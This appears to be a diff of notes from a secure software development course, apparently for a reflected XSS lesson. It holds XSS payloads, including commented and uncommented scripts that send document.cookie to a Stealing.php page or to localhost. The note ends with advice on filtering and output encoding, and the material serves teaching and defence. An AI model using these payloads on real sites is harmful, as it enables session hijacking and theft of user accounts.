@@ -8,9 +8,12 @@ Insert new student
 
     //<script>alert('xy');</script>
 
-    //<script>window.location="http://localhost/SecureSoftwareDevelopment/Lecture4/2XSS/3ReflectedXSS/Stealing.php?cookie="+document.cookie; </script>
+    //<script>window.location="http://localhost/SecureSoftwareDevelopment/Lecture7OWASPTop10/1XSS/2ReflectedXSS/Stealing.php?cookie="+document.cookie; </script>
     //<script> window.location.href="./Stealing.php?cookie=\'+document.cookie </script>
-       //<script>window.location.href="./Stealing.php?cookie="+document.cookie; </script>
+       //<script>window.location.href=\"./Stealing.php?cookie=\"+document.cookie; </script>
+       
+       <script> window.location=\'http://localhost/?cookie=\'+document.cookie </script>
+       <script> window.location=\'http://localhost/?cookie=\'+document.cookie </script>
      
 window.location.href = "./Stealing.php?cookie="+document.cookie;
 apply filtering and output encoding in set member functions (code reuse)
